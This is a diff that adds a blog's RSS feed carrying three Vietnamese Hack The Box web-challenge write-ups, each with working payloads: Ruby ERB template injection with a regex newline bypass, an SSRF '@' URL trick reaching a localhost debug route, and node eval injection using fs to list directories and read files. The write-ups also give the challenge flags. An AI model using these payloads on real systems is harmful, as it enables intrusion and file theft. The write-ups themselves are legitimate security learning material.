@@ -1,0 +1,134 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Htb - Tag - g03m0n</title>
+        <link>https://g03m0n.github.io/tags/htb/</link>
+        <description>Htb - Tag - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/htb/" rel="self" type="application/rss+xml" /><item>
+    <title>Hackthebox - Neonify</title>
+    <link>https://g03m0n.github.io/posts/hackthebox---neonify/hackthebox-neonify/</link>
+    <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/hackthebox---neonify/hackthebox-neonify/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/Neonify" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Đọc source code ta có thể thấy ứng dụng chạy bằng Ruby và sử dụng <a href="https://docs.ruby-lang.org/en/2.3.0/ERB.html" target="_blank" rel="noopener noreffer">ERB template</a>
+ để render.
+Đây có thể là một bài SSTI Ruby ERB Template.</p>
+<p>Ngoài ra input còn bị regrex match với tất cả kí tự từ 0 tới 9, từ a tới z.</p>
+<p></p>
+<p>Ở đây regex sẽ chỉ match từ đầu tới cuối ở trong một dòng, tức là nếu chèn vào một string bất kì rồi dùng ký tự new line <code>(\n)</code> để xuống dòng, rồi chèn vào payload SSTI thì sẽ exploit thành công.</p>
+<p>Đọc thêm tại đây: <a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/" target="_blank" rel="noopener noreffer">https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/</a>
+</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>keke
+&lt;%= File.open(&#39;flag.txt&#39;).read %&gt;
+</code></pre><p>Endcode payload:</p>
+<p></p>
+<p>Chèn payload và gửi request:</p>
+<p></p>
+<p>Flag: <code>HTB{r3pl4c3m3n7_s3cur1ty}</code></p>
+]]></description>
+</item>
+<item>
+    <title>Hackthebox - ProxyAsService</title>
+    <link>https://g03m0n.github.io/posts/hacthebox---proxyasservice/hackthebox-proxyasservice/</link>
+    <pubDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/hacthebox---proxyasservice/hackthebox-proxyasservice/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Challenge này là một <code>proxy</code> giữa ta và một trang web khác.
+Ở đây là <a href="reddit.com" rel="">Reddit</a>
+.
+Lần đầu tiên khi truy cập vào challenge, ta sẽ được chuyển hướng đến một <code>subreddit</code> ngẫu nhiên về mèo:</p>
+<p></p>
+<p>Tuy nhiên, ta có thể thấy <code>url</code> của trang web vẫn nằm ở <code>proxy</code> chứ không hoàn toàn chuyển hướng đến <code>reddit</code>.</p>
+<h3 id="exploitaion">Exploitaion</h3>
+<p>Đầu tiên, kiểm tra source code của challenge.
+Ứng dụng web được chạy trên cổng <code>1337</code>.</p>
+<p></p>
+<p>Flag được lưu ở route <code>/environment</code>.</p>
+<p></p>
+<p>Tuy nhiên, ta chỉ có thể truy cập vào route <code>/environment</code> bằng <code>localhost</code>.</p>
+<p></p>
+<p>Kiểm tra file route.py.</p>
+<p></p>
+<p>Ta có thể thấy url được thêm vào cuối <code>target_url</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;http://</span><span style="color:#e6db74">{</span>SITE_NAME<span style="color:#e6db74">}{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>Ở phía cuối của <code>url</code> không có dấu <code>/</code> nên ta có thể sử dụng cách khai thác này:</p>
+<pre tabindex="0"><code>http://1.1.1.1@0.0.0.0 =&gt; http://0.0.0.0
+</code></pre><p>Khi ta thêm dấu <code>@</code> vào cuối <code>url</code> thì tất cả các thành phần trước dấu <code>@</code> sẽ được comment và sẽ chuyển hướng đến <code>url</code> được điền phía sau dấu <code>@</code>.</p>
+<p>Kiểm tra:</p>
+<p></p>
+<p>Payload với route <code>/debug/environment</code> và port <code>1337</code>:</p>
+<pre tabindex="0"><code>http://94.237.58.211:56744/?url=@localhost:1337/debug/environment
+</code></pre><p>Xuất hiện thông báo lỗi.</p>
+<p></p>
+<p>Kiểm tra soucre code ta thấy server sử dụng một <code>blacklists</code> để kiểm tra đầu vào:</p>
+<p></p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass" target="_blank" rel="noopener noreffer">Đây</a>
+ là một số cách để truy cập <code>localhost</code>.
+Thử truy cập với <code>0.0.0.0</code>:
+Payload:</p>
+<pre tabindex="0"><code>http://94.237.58.211:56744/?url=@0.0.0.0:1337/debug/environment
+</code></pre><p></p>
+<p>Flag: <code>HTB{fl4gs_4s_4_S3rv1c3}</code></p>
+]]></description>
+</item>
+<item>
+    <title>Hackthebox - jscalc</title>
+    <link>https://g03m0n.github.io/posts/hackthebox---jscalc/hackthebox-jscalc/</link>
+    <pubDate>Tue, 22 Aug 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/hackthebox---jscalc/hackthebox-jscalc/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/jscalc" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Vì chương trình sử dụng hàm <code>eval()</code> để tính toán nên ta có thể tiêm vào một payload XSS:</p>
+<pre tabindex="0"><code>100*10-3+340 +&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39;
+</code></pre><p></p>
+<p>Kiểm tra source code, đọc file <code>package.json</code>, nhận thấy challenge sử dụng <code>node.js</code>
+=&gt; Có thể <a href="https://www.codecademy.com/learn/javascript-back-end-development/modules/introduction-to-node-js/cheatsheet" target="_blank" rel="noopener noreffer">execute JavaScript code</a>
+ ở back-end.</p>
+<p></p>
+<p>Chương trình sử dụng API <code>api/calculate</code>.
+Từ <code>web_jscalc/challenge/routes/computerHelper.js</code>, hàm <code>calculate()</code> trả về kết quả từ hàm <code>eval()</code> và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp. Do đó nó không kiểm tra các trường hợp ngoại lệ khác.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">---</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">calculate</span>(<span style="color:#a6e22e">formula</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">`(function() { return ${ formula } ;}())`</span>);                                                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Something went wrong!&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span>
+</span></span></code></pre></div><p><code>Node.js</code> có một số mô-đun tích hợp có thể được sử dụng để chèn lệnh: <code>process</code>, <code>fs</code>, <code>readdir()</code>, <code>readFile()</code>,&hellip;</p>
+<p>Tiến hành khai thác:
+Đầu tiên kiểm tra đường dẫn hiện tại bằng query:</p>
+<pre tabindex="0"><code>process.cwd()
+</code></pre><p></p>
+<p>Kiểm tra các thư mục và file có trong thư mục hiện tại bằng cách sử dụng <code>readdirSync()</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;/app&#39;).toString()
+</code></pre><p></p>
+<p>Thêm dấu <code>..</code> vào trước đường dẫn để kiểm tra tại thư mục <code>/</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;../&#39;).toString()
+</code></pre><p></p>
+<p>Sử dụng <code>readFileSync()</code> để đọc file <code>flag.txt</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readFileSync(&#34;/flax.txt&#34;).toString()
+</code></pre><p></p>
+<p>Flag: <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
+]]></description>
+</item>
+</channel>
+</rss>
